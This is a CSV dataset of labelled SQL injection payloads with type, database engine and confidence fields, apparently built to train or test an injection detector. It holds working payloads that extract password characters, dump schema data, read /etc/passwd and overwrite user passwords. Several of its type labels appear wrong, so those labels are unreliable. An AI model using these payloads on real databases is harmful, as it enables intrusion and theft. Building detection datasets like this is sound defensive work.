id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40470,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",union_based,oracle,0.9,Signals: 'utl_inaddr'; UNION-based payload detected; DB: oracle,0
40482,"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",union_based,mssql,0.9,Signals: 'sysobjects'; UNION-based payload detected; DB: mssql,0
40484,1;SELECT TOP 1 table_name FROM information_schema.tables--,union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,0
40498,"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,0
40510,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,0
40512,"' AND BINARY SUBSTRING(password,1,1)='a'--",auth_bypass,mysql,0.9,Signals: 'ord'; Authentication bypass pattern; DB: mysql,0
40517,1'; UPDATE users SET password='hacked' WHERE '1'='1,auth_bypass,mysql,0.9,Signals: 'ord'; Authentication bypass pattern; DB: mysql,0
40522,"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",union_based,mysql,0.9,Signals: 'load_file'; UNION-based payload detected; DB: mysql,0
40533,' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,0
40534,"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,0
40536,"' AND ORD(MID(password,1,1))>64 AND '1'='1",auth_bypass,mysql,0.9,Signals: 'ord'; Authentication bypass pattern; DB: mysql,0
40541,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,0
40400,"(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) (SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END))",union_based,sqlite,0.7,UNION-based payload detected; DB: sqlite. Payload length: 193 chars.,0
40401,"(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])",union_based,firebird,0.7,UNION-based payload detected; DB: firebird. Payload length: 222 chars.,0
40402,"(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) (SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)",union_based,generic,0.7,UNION-based payload detected. Payload length: 277 chars.,0
40403,"(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 203 chars.,0
40404,"(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) (SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)",union_based,mysql,0.7,UNION-based payload detected; DB: mysql. Payload length: 355 chars.,0
40405,"(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0))) (SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))",union_based,generic,0.7,UNION-based payload detected. Payload length: 325 chars.,0
40406,(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END),union_based,generic,0.7,UNION-based payload detected. Payload length: 135 chars.,0
40407,",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)) ,(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))",union_based,mysql,0.7,UNION-based payload detected; DB: mysql. Payload length: 165 chars.,0
